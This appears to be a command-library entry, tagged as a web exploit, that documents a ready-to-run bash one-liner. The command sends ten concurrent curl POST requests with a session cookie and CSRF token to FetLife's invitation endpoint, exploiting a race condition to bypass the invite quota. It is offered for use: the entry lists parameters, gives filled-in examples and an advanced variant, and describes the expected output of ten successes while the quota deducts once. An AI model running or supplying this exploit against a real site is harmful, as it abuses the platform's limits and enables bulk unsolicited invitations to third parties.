---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_8}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_9}' &
  curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie:
  _fl_sessionid={session_id}' --data
  'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_10}'
tags:
  - web-exploit
  - race-condition
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:22.336Z'
verified: false
validated: true
submitted: true
---
# concurrent-curl-invites-fetlife

## Command

```bash
curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_8}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_9}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_10}'
```

## Description

This command sends 10 concurrent POST requests to FetLife's invitation endpoint using chained curl invocations backgrounded with '&', exploiting a race condition to bypass quota limits. Use when authenticated and aiming to send bulk invites.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{session_id}` | Value of _fl_sessionid cookie from browser | Yes |
| `{authenticity_token}` | CSRF token from invitation form | Yes |
| `{email_address_N}` | URL-encoded unique email (e.g., example%2B1%40gmail.com) for each of 10 instances | Yes |
| `-H 'User-Agent: cur1'` | Custom user agent to mimic browser | No |
| `--data` | POST body with token and email | Yes |

## Examples

### Basic Usage

Replace placeholders and run in terminal:

```bash
curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid=abc123' --data 'authenticity_token=def456&user%5Bemail%5D=test%401.com' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid=abc123' --data 'authenticity_token=def456&user%5Bemail%5D=test%402.com'
```

(Scale to 10 for full effect.)

### Advanced Usage

Add silent mode with `-s` to each curl for cleaner output:

```bash
curl -s 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & ... (repeat for 10)
```

## Expected Output

Concurrent HTTP responses: Multiple lines of HTML redirects or success messages (e.g., "Invitation sent"), indicating 10 successes while quota deducts only once. Check FetLife dashboard for confirmation.

## Related

- [[Related Procedure|procedures/Exploit-FetLife-Invitation-Race-Condition]]
